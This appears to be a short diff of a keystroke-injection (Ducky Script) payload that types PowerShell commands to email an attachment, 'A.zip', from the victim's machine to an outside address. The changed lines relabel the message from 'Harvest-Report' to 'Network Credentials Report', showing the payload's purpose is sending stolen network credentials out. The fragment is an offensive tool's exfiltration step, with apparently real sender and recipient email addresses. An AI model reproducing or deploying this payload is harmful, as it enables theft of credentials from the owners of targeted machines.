@@ -47,9 +47,9 @@ STRING $ReportEmail.From = 'aleniero8989@gmail.com'
 ENTER
 STRING $ReportEmail.To.Add('varocarras@gmail.com')
 ENTER
-STRING $ReportEmail.Subject = "Harvest-Report"
+STRING $ReportEmail.Subject = "Network Credentials Report"
 ENTER
-STRING $ReportEmail.Body = "GG, you got it"
+STRING $ReportEmail.Body = "Below are the details from the machine"
 ENTER
 STRING $ReportEmail.Attachments.Add("A.zip")
 ENTER
